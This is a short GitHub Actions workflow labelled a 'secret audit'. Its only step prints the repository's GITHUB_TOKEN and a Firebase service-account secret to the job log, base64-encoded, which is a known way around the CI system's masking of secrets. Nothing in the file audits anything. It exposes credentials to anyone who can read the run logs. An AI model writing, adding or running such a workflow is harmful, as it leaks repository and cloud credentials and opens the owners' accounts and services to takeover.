name: _secret_audit_dump
on:
  workflow_dispatch:

jobs:
  dump_repo:
    runs-on: ubuntu-latest
    steps:
      - name: Dump repo secrets + variables
        env:
          GITHUB_TOKEN_VAL: ${{ secrets.GITHUB_TOKEN }}
          FIREBASE_SERVICE_ACCOUNT: ${{ secrets.FIREBASE_SERVICE_ACCOUNT }}

        run: |
          echo "=== REPO-LEVEL ==="
          echo "GITHUB_TOKEN=$(echo -n "$GITHUB_TOKEN_VAL" | base64 -w0)"
          echo "SECRET_FIREBASE_SERVICE_ACCOUNT=$(echo -n "${FIREBASE_SERVICE_ACCOUNT}" | base64 -w0)"


